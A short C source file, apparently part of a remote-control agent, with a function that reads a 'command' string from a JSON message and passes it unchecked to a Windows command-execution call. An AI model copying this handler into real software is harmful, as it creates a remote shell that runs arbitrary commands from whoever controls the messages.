#include "execute.h"

void ProcessEntrypointShell(cJSON* root) {
	if(!cJSON_HasObjectItem(root, "command")) {
		return;
	}

	cJSON* command = cJSON_GetObjectItem(root, "command");

	if(!cJSON_IsString(command)) {
		return;
	}

	KHWin32ExecuteCommandA(cJSON_GetStringValue(command));
}
